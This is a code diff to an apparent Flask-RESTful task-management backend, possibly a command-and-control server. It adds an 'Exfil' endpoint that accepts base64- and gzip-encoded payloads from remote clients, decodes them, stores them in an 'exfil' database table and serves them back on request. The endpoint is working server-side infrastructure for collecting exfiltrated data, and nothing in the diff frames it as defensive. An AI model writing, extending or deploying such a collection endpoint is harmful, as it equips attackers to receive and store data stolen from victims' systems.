@@ -2,6 +2,8 @@ import uuid
 
 from flask import request
 from flask_restful import Resource
+import gzip
+import base64
 
 
 class Tasks(Resource):
@@ -211,6 +213,44 @@ class History(Resource):
         try:
             # Return full execution history of all tasks with context and results
             response = self.supabase.table("history").select("*").execute()
+            return response.data, 200
+        except Exception as e:
+            return {"error": str(e)}, 500
+        
+class Exfil(Resource):
+    def __init__(self, supabase):
+        self.supabase = supabase
+
+    def _decode(self, raw: str) -> str:
+        try:
+            return gzip.decompress(base64.b64decode(raw)).decode(errors="replace")
+        except Exception:
+            return raw
+
+    def post(self):
+        try:
+            payload_b64 = request.form.get("payload")
+            label       = request.form.get("label", "unlabeled")
+
+            if not payload_b64:
+                return {"error": "Missing 'payload' field"}, 400
+
+            decoded = self._decode(payload_b64)
+
+            record = {
+                "id":      str(uuid.uuid4()),
+                "label":   label,
+                "content": decoded,
+            }
+            self.supabase.table("exfil").insert(record).execute()
+            return {"status": "received", "label": label}, 200
+
+        except Exception as e:
+            return {"error": str(e)}, 500
+
+    def get(self):
+        try:
+            response = self.supabase.table("exfil").select("*").execute()
             return response.data, 200
         except Exception as e:
             return {"error": str(e)}, 500
